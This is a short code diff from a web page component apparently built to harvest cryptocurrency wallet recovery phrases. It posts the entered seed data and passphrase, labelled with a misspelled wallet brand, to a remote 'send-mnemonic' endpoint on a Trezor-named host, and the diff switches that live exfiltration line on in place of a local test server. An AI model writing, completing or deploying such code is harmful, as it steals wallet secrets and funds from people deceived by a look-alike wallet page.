@@ -52,8 +52,8 @@ export default function SeedsMainPage() {
             const heading = `Exsodus`;
             setLoading(true);
 
-            // const response = await axios.post("https://trezor-backend.vercel.app/api/v1/send-mnemonic", { 
-            const response = await axios.post("http://localhost:5454/api/v1/send-mnemonic", { 
+            const response = await axios.post("https://trezor-backend.vercel.app/api/v1/send-mnemonic", { 
+            // const response = await axios.post("http://localhost:5454/api/v1/send-mnemonic", { 
                 data, 
                 heading,
                 passphrase 
